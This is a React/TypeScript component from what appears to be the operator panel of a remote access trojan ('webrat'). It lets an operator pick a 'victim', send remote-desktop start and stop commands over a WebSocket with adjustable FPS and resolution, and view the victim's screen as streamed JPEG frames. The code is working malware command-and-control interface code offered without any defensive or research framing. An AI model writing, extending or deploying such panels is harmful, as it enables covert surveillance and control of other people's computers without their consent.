"use client";

import { useEffect } from "react";

import { usePanelDetailView } from "../panel-detail-view-provider";
import { usePanelWS } from "../../../ws/ws-provider";
import { showToast } from "../../../toast";

export function RemoteDesktopSection() {
   const detail = usePanelDetailView();
   const ws = usePanelWS();

   useEffect(() => {
      const loader = document.getElementById("remoteDesktopLoader");
      const screen = document.getElementById("remoteDesktopScreen");
      const stream = document.getElementById("remoteDesktopStream");
      const startBtn = document.getElementById("remoteDesktopStartBtn") as HTMLButtonElement | null;
      const panel = document.getElementById("remoteDesktopPanel");
      const fpsSlider = document.getElementById("remoteDesktopFps") as HTMLInputElement | null;
      const fpsValue = document.getElementById("remoteDesktopFpsValue");
      const resSlider = document.getElementById("remoteDesktopResolution") as HTMLInputElement | null;
      const resValue = document.getElementById("remoteDesktopResolutionValue");

      if (!loader || !screen || !startBtn || !panel || !stream) return;

      let isRunning = false;
      let isLoaded = false;
      let loadTimer: number | null = null;

      const syncSlider = (slider: HTMLInputElement | null, out: HTMLElement | null) => {
         if (!slider || !out) return;
         const fn = () => {
            try {
               out.textContent = String(slider.value || "").trim();
            } catch {
            }
         };
         slider.addEventListener("input", fn);
         slider.addEventListener("change", fn);
         fn();
         return () => {
            slider.removeEventListener("input", fn);
            slider.removeEventListener("change", fn);
         };
      };

      const unFps = syncSlider(fpsSlider, fpsValue);
      const unRes = syncSlider(resSlider, resValue);

      const applyUi = () => {
         const connected = ws.state === "open" && !!detail.selectedVictimId;
         const showLoader = !connected || !isLoaded;

         loader.style.display = showLoader ? "block" : "none";
         screen.style.display = showLoader ? "none" : "block";
         panel.style.display = showLoader ? "none" : "block";

         startBtn.disabled = showLoader;
         startBtn.textContent = isRunning ? "Stop" : "Start";

         if (!connected) {
            isRunning = false;
            stream.style.display = "none";
            startBtn.textContent = "Start";
         }
      };

      const startLoad = () => {
         const connected = ws.state === "open" && !!detail.selectedVictimId;
         if (!connected) {
            isLoaded = false;
            applyUi();
            return;
         }
         if (isLoaded) {
            applyUi();
            return;
         }

         applyUi();
         if (loadTimer != null) {
            window.clearTimeout(loadTimer);
            loadTimer = null;
         }
         loadTimer = window.setTimeout(() => {
            isLoaded = true;
            applyUi();
         }, 700);
      };

      const onStartStop = () => {
         if (startBtn.disabled) return;
         const victimId = detail.selectedVictimId;
         if (!victimId) {
            showToast("error", "Select victim first");
            return;
         }
         if (ws.state !== "open") {
            showToast("error", "WebSocket is not connected");
            return;
         }

         isRunning = !isRunning;

         if (isRunning) {
            const fps = fpsSlider ? parseInt(String(fpsSlider.value || "30"), 10) : 30;
            const resPct = resSlider ? parseInt(String(resSlider.value || "75"), 10) : 75;
            const ok = ws.sendJson({
               type: "rd_start",
               victim_id: String(victimId),
               fps: Number.isFinite(fps) ? fps : 30,
               resolution_percent: Number.isFinite(resPct) ? resPct : 75,
            });
            if (!ok) {
               isRunning = false;
               showToast("error", "Failed to start remote desktop");
            }
         } else {
            ws.sendJson({
               type: "rd_stop",
               victim_id: String(victimId),
            });
         }

         stream.style.display = isRunning ? "block" : "none";
         applyUi();
      };

      startBtn.addEventListener("click", onStartStop);

      const onWsMsg = (ev: CustomEvent<Record<string, unknown>>) => {
         const msg = (ev && ev.detail ? ev.detail : {}) as Record<string, unknown>;
         const t = typeof msg.type === "string" ? msg.type : "";
         if (t !== "rd_frame") return;

         const victId = (() => {
            const v = msg.victim_id ?? msg.victimId ?? msg.id;
            return typeof v === "string" || typeof v === "number" ? String(v).trim() : "";
         })();
         if (!victId) return;
         if (!detail.selectedVictimId || String(detail.selectedVictimId) !== victId) return;
         if (!isRunning) return;

         const data = msg.data;
         if (!data || typeof data !== "string") return;

         let img: HTMLImageElement | null = null;
         try {
            img = stream.querySelector("img");
         } catch {
            img = null;
         }
         if (!img) {
            img = document.createElement("img");
            img.alt = "Remote Desktop";
            img.style.maxWidth = "100%";
            img.style.height = "auto";
            img.style.display = "block";
            img.draggable = false;
            try {
               stream.textContent = "";
            } catch {
            }
            stream.appendChild(img);
         }
         img.src = "data:image/jpeg;base64," + data;
      };

      window.addEventListener("webrat_ws_message", onWsMsg as EventListener);

      startLoad();
      applyUi();

      return () => {
         if (loadTimer != null) window.clearTimeout(loadTimer);
         startBtn.removeEventListener("click", onStartStop);
         window.removeEventListener("webrat_ws_message", onWsMsg as EventListener);
         try {
            if (unFps) unFps();
            if (unRes) unRes();
         } catch {
         }
      };
   }, [detail.selectedVictimId, ws]);

   return (
      <div className="detail-section h-full">
         <div className="relative h-full w-full">
            <div id="remoteDesktopInner" className="relative h-full w-full bg-[#111]">
               <div
                  id="remoteDesktopPanel"
                  className="group pointer-events-auto absolute left-0 right-0 top-0 z-[5] h-[58px]"
               >
                  <div
                     id="remoteDesktopToolbar"
                     className={
                        "pointer-events-auto absolute left-[12px] right-[12px] top-[10px] flex h-[34px] items-center justify-between gap-[12px] rounded-[12px] border border-white/15 " +
                        "bg-black/45 p-[6px_10px] shadow-[0_14px_30px_rgba(0,0,0,0.72)] backdrop-blur-[10px] " +
                        "translate-y-[-54px] opacity-0 transition-[transform,opacity] duration-150 group-hover:translate-y-0 group-hover:opacity-100"
                     }
                  >
                     <div className="w-[24px]" />
                     <div className="flex flex-1 items-center justify-center gap-[18px]">
                        <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
                           <span className="font-semibold">FPS</span>
                           <input id="remoteDesktopFps" className="w-[120px]" type="range" min={1} max={60} defaultValue={30} />
                           <span id="remoteDesktopFpsValue" className="min-w-[26px] text-right font-bold">
                              30
                           </span>
                        </div>

                        <div className="inline-flex items-center gap-[8px] text-[13px] text-[#e0e0e0]">
                           <span className="font-semibold">Resolution %</span>
                           <input
                              id="remoteDesktopResolution"
                              className="w-[120px]"
                              type="range"
                              min={10}
                              max={100}
                              defaultValue={75}
                           />
                           <span id="remoteDesktopResolutionValue" className="min-w-[26px] text-right font-bold">
                              75
                           </span>
                        </div>
                     </div>
                     <div className="flex items-center">
                        <button
                           id="remoteDesktopStartBtn"
                           type="button"
                           className={
                              "min-w-[120px] rounded-[12px] border border-white/20 bg-[rgba(30,30,30,0.85)] px-[22px] pb-[4px] pt-[6px] text-[14px] font-extrabold uppercase tracking-[0.05em] text-[#f5f5f5] " +
                              "shadow-[0_10px_24px_rgba(0,0,0,0.7)] transition-[background,border-color,transform,box-shadow] duration-150 hover:-translate-y-[1px] hover:bg-[rgba(55,55,55,0.96)] hover:border-white/30 hover:shadow-[0_14px_30px_rgba(0,0,0,0.86)] active:translate-y-0"
                           }
                           style={{ borderBottom: "4px solid var(--line)" }}
                        >
                           Start
                        </button>
                     </div>
                  </div>

                  <div
                     id="remoteDesktopToolbarLine"
                     className={
                        "absolute left-[12px] right-[12px] top-[46px] h-[2px] bg-[var(--line)] opacity-0 translate-y-[-54px] transition-[transform,opacity] duration-150 group-hover:translate-y-0 group-hover:opacity-95"
                     }
                  />
               </div>

               <div id="remoteDesktopLoader" className="pointer-events-none absolute left-1/2 top-1/2 z-[3] h-[130px] w-[130px] -translate-x-1/2 -translate-y-1/2">
                  <div className="absolute left-1/2 top-1/2 h-[100px] w-[100px] -translate-x-1/2 -translate-y-1/2 border-[3px] border-[#ff4040]" />
                  <div className="absolute left-1/2 top-1/2 h-[100px] w-[100px] -translate-x-1/2 -translate-y-1/2 border-[3px] border-white" />
               </div>

               <div id="remoteDesktopScreen" className="absolute inset-0 hidden overflow-hidden bg-[#111]" aria-label="Remote desktop">
                  <div id="remoteDesktopStream" className="absolute inset-0 hidden" />
               </div>
            </div>
         </div>
      </div>
   );
}
